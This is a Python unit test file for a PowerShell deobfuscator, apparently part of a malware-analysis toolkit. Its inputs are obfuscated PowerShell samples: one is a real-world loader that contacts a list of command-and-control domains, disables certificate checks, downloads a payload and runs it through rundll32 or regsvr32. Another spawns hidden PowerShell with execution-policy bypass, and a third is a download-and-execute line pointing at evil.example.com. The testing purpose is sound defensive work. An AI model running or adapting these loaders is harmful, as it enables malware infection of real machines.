#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from ... import TestUnitBase


class TestPowerShellDeobfuscator(TestUnitBase):

    def test_real_world_01(self):
        data = BR'''&('set-varIAbLE') gHc7R6XtR8aE 16;.('SET-vaRIabLE') PkfYKFVSBTmn 27;.(.    ('{2}{0}{1}'-f'c','m','g')    ('{4}{2}{3}{0}{5}{6}{7}{8}{6}{9}{1}{2}'-f'-','l','e','t','s','v','a','r','i','b')) EUCsMplIyR03 43;&(&('{0}{1}{2}'-f'g','c','m')"seT-VARiaBLe") F8riv8rRCqrK((((&"get-vARiaBle" gHc7R6XtR8aE).('vaLUE')+29)-AS[chaR]).('tOsTrinG').iNVoke()+(((."GeT-VaRIAblE" PkfYKFVSBTmn).('{4}{2}{0}{1}{3}'-f'l','u','a','e','v')+74)-as[CHAR]).('tosTrInG').INVOke()+(((&"gEt-VarIabLe" EUCsMplIyR03)."VaLUE"+56)-as[cHAr]).('{4}{2}{5}{4}{3}{1}{0}{6}'-f'n','i','o','r','t','s','g').INvOke());PowERsHELL -NONiNtErac -nOLOgo -NOP -Windows HIDDEn -ExEC BYpasS (    .('{7}{4}{9}{0}{2}{3}{1}{6}{3}{5}{8}{4}'-f'-','r','v','a','e','b','i','g','l','t') F8riv8rRCqrK).('{4}{3}{1}{0}{2}'-f'u','l','e','a','v')    .('{5}{2}{6}{5}{4}{0}{1}{3}'-f'i','n','o','g','r','t','s').iNvokE()'''
        result = self.load().process(data)
        self.assertTrue(
            result.count(b'Set-Variable') == 4
        )

    def test_real_world_02(self):
        data = BR'''sEt-iTEM ('v'+'aria'+'bLE:'+'s2P4'+'O')  (  [Type]("{1}{0}" -F'vERt','CON')  ); Set-ITeM  ('varIablE'+':'+'t51') ([type]("{7}{1}{0}{3}{6}{5}{4}{2}"-F 'omPReSsion.cOMP','O.C','E','rE','oNmOd','SI','s','i')  )  ;seT-VARiaBlE  ("t"+"u49Q") ( [type]("{2}{3}{4}{0}{1}{5}" -f'c','EpoIn','NeT.S','e','RvI','tmanAgeR')  );   SET  ("{1}{0}" -f'vYp','7')  (  [TyPE]("{0}{6}{4}{1}{7}{5}{3}{2}" -f 'NET.se','yP','PE','y','uriT','Olt','C','rOtoC')  )  ; SET ('CUw'+'3')  ([TYpE]("{5}{2}{7}{3}{0}{1}{4}{6}" -f 'pOi','N','YSTeM','ervIcE','Tm','s','aNAGER','.Net.S') ) ; ${b`x1`4N}  =  [tYPE]("{1}{2}{0}" -F'T','Net.We','breqUeS')  ; ${Yn4U`15} =  [tYpE]("{3}{2}{0}{1}"-F'ch','E','nTiAlcA','neT.CrEDE')  ;SET-iteM  ("{3}{0}{1}{2}" -f 'bLe:','TQ','4pIV','VARia') (  [tyPE]("{0}{2}{4}{1}{3}" -f 'Te','d','Xt','INg','.EncO') );sv ("{1}{0}" -f'9PUc','Xt') ([tYPE]("{2}{1}{0}"-f 'E','Il','Io.f')  ) ; ${rU`o3}= [TypE]("{2}{0}{1}"-F 'V','AtoR','aCti') ;  SeT-itEM  ('VariA'+'bl'+'E:Ipjn')  ([type]("{0}{1}"-f 'TY','PE') ); ${r`o}=("{1}{2}{0}" -f'.1','127','.0.0');${r`EU} = P`ING ${r`O};if (${R`eU} -match ("{1}{0}"-f 'evut','ic')){${Ks}=ge`T`-RaNdOm -Max 11;function tR`iomE(${T`e}){${I`i}= (gi ('V'+'AriA'+'BlE:'+'s2p4'+'O')  ).vaLue::("{2}{1}{0}{3}" -f'se','mBa','Fro','64String').Invoke(${te});return ${ii}};function aS(${S`A}){-join((${s`A}."le`N`gTh"-1)..0|foreacH-`oB`J`EcT{${sA}[${_}]})};${b`Iz}=$(g`ET-`wmIoBj`eCT ("{1}{5}{2}{6}{3}{4}{0}"-f't','Win32','mp','stemProd','uc','_Co','uterSy') -computername ('.') | S`eL`ECt-`ObjEct -ExpandProperty ("{0}{1}" -f 'U','UID'));function NI`Ll(${T`yo}){${kj}=nE`w`-`oBJeCt ("{3}{0}{2}{1}"-f'O.Mem','tream','oryS','I')(,${T`yo});${m`m}=(NEW`-o`BJEct ("{0}{3}{2}{4}{1}"-f'IO.','r','mRead','Strea','e')(N`EW-`OBJ`eCt ("{2}{0}{3}{4}{1}{5}{6}"-f 'mpr','pStr','IO.Co','ession.Gz','i','ea','m')(${Kj}, ( gEt-varIablE  ("t5"+"1")).vAlUE::"D`e`COMPRESs"))).("{1}{2}{0}" -f 'ToEnd','R','ead').Invoke();return ${m`m}};function t{${Z}=@(("{1}{2}{3}{0}"-f 'm','mictosof','ts','.co'),("{2}{1}{0}{3}{4}"-f'rs.','e','qartabe','c','om'),("{5}{1}{4}{2}{0}{3}"-f 'iadelleentrat','g','z','e.site','en','a'),("{1}{2}{3}{0}"-f 'm','teslao','ilcar','.co'),("{0}{1}{4}{2}{3}"-f 'h','o','.','com','likokooo'),("{1}{0}{2}{3}{4}"-f'l','ub','a','znze.','online'),("{3}{2}{1}{0}"-f'icu','.','ak','hiteron'),("{1}{2}{0}" -f'te','ab','rakam.si'));${z}=${Z}|s`oRT-`obJE`Ct {GeT`-raND`om};Foreach(${T} in ${Z}){if(.("{1}{2}{4}{3}{0}"-f 'n','T','est-Co','ectio','nn') (${t}) -Count 1 -quiet){${Rr}=${T};}};return ''+'ht'+'tp'+("{1}{0}" -f '://','s')+${r`R}+'/'+''};function O`sI{${rY}=&('T');${m}=${R`Y}+'?'+${B`Iz};  (  Ls ('V'+'ARIabl'+'E:'+'Tu'+'49Q')).VAlUe::"Se`cUR`i`TyP`RoTO`COL"= (  GEt-vaRiABle  ("{0}{1}" -f '7v','YP') -Value)::"T`Ls"; (  get-cHildiTem  ('vArIaB'+'Le'+':cuW'+'3')  ).VaLUe::"s`eR`VerceRtI`FI`c`A`TEVAliDat`iOnCAllb`ACK"={${T`Rue}};${a}=&("{2}{1}{0}" -f 't','objec','new-') ("{2}{1}{0}" -f 'nt','ie','net.webcl');${A}."Pro`Xy"= (  vaRIABLe ('B'+'X14n') ).valUe::("{2}{3}{1}{0}{4}" -f 'eb','temW','G','etSys','Proxy').Invoke();${a}."pRO`xY"."crEDenTi`A`lS"= (  get-cHildITem ("{0}{1}{3}{2}{4}"-f'Var','i','bLE:Y','a','N4U15')).vaLue::"DeFAul`T`crED`eN`TiaLs";return &("{0}{1}"-f 'N','iLL')(${A}.("{2}{1}{3}{0}"-f 'a','nloadD','dow','at').Invoke(${m}))};.("{0}{1}"-f's','al') ("{0}{1}"-f'ra','ndomG') ("{1}{2}{0}" -f'l32','run','dl');function K`eLv{${FD}=&("{1}{0}" -f 'i','os');${U}=${Fd}.("{2}{0}{1}"-f 'ubst','ring','s').Invoke(0,1);${E`F}=${f`d}.("{1}{0}"-f 'move','re').Invoke(0,1);${o`o}=${EF} -split'!';${Vr}=  (  VaRIABLE  ("{1}{2}{0}"-f 'Piv','Tq','4')).VaLUE::"UT`F8";foreach(${O} in ${O`o}[0]){${o`UT}=@();${O`A}=${U}.("{2}{1}{0}"-f'ay','arArr','ToCh').Invoke();${O}=.("{0}{1}"-f 'T','riome')(${o});for(${i}=0; ${I} -lt ${o}."cOU`NT"; ${I}++){${O`UT} += [char]([Byte]${O}[${I}] -bxor[Byte]${oA}[${i}%${O`A}."C`OUnT"])}};${sS}=${e`F}."r`E`plAcE"((${Oo}[0]+"!"),${V`R}."gE`TstrI`Ng"(${O`UT}));return ${s`S}};${a`ZQ}=${eN`V:t`eMP};${f`BF}=(${D}=.("{0}{1}" -f 'g','ci') ${a`Zq}|&("{0}{1}{2}" -f'g','et-rand','om'))."nA`me" -replace ".{5}$";${H`B}=${a`Zq}+'\'+${F`Bf}+'.';function Cal`CC{${K`I}=.("{0}{1}" -f'kel','v');  ( gEt-vAriABlE  ("{0}{1}" -f 'xt9','Puc')  ).VALuE::("{2}{1}{0}" -f 'tes','llBy','WriteA').Invoke(${h`B},(&("{0}{2}{1}" -f 'T','e','riom')(${k`i} -replace ".{200}$")));if((&("{0}{1}"-f 'g','ci') ${H`B})."l`En`GtH" -lt 256){exit};${iz}=.('as')(("{2}{0}{1}{3}"-f 'evr','eSret','r','sigeRllD'));if (${ks} %2 -eq 0){&("{0}{1}" -f'ran','domG') ${hB} ${i`z};&("{0}{1}"-f'slee','p') 35;}else{${m`J}= (vARIAblE  ('rUO'+'3')  -vALueONlY)::"CrEatEi`NSTa`NCE"( ${I`pjn}::("{2}{0}{1}{3}"-f'ypefrom','cl','gett','sid').Invoke("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));${Mj}."Doc`U`MeNt"."app`LI`CaT`iON"."Pa`REnT".("{1}{0}{2}"-f'hel','s','lexecute').Invoke(("{0}{1}"-f'r','undll32'),(' '+"$Hb "+"$iZ"),("{3}{1}{0}{2}{4}" -f'ndowsSy','Wi','stem','C:','32'),${n`ULL},0);&("{1}{0}" -f 'leep','s') 35};.('sl');.("{2}{1}{0}"-f'svr32','eg','r') ('/s') ${h`B} > ${Hb}};&("{0}{1}"-f 'Ca','lcc')}else{exit}'''
        result = self.load().process(data)
        for c2server in [
            B'mictosofts.com',
            B'qartabeers.com',
            B'agenziadelleentrate.site',
            B'teslaoilcar.com',
            B'holikokooo.com',
            B'ublaznze.online',
            B'hiteronak.icu',
            B'abrakam.site'
        ]:
            self.assertIn(c2server, result)

    def test_real_world_03(self):
        data = BR'''$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e').Replace('s2Wr6qQR', 'wnloadS'))))'''
        deob = self.load()
        extract = self.ldu('carve', 'ps1str', single=True, decode=True)
        self.assertIn(b'https://evil.example.com/boom',
            data | deob | extract | deob | bytes)
